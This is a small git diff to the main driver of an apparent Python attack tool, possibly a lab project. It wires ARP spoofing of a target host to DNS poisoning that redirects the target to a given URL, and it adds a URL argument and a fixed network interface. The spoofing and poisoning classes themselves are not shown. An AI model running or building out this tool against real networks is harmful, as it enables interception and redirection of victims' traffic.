@@ -6,7 +6,7 @@ from DnsPoisoning import DnsPoisoning
 if __name__ == "__main__":
     arguments = sys.argv
     ips = []
-    argReq = 3
+    argReq = 4
 
     if len(sys.argv) != argReq:
         print("Wrong amount of arguments provide", argReq-1, "arguments")
@@ -19,9 +19,11 @@ if __name__ == "__main__":
 
     hostToAttack = ips[0]
     hostToSpoof = ips[1]
+    url = ips[2]
 
-    arpSpoofing = ArpSpoofing()
+    interface = "enp0s3"
+    arpSpoofing = ArpSpoofing(interface)
     arpSpoof = arpSpoofing.doSpoof(hostToAttack, hostToSpoof)
 
     dnsPoisoning = DnsPoisoning()
-    dnsPoison = dnsPoisoning.doPoison()
+    dnsPoison = dnsPoisoning.doPoison(hostToAttack, url)
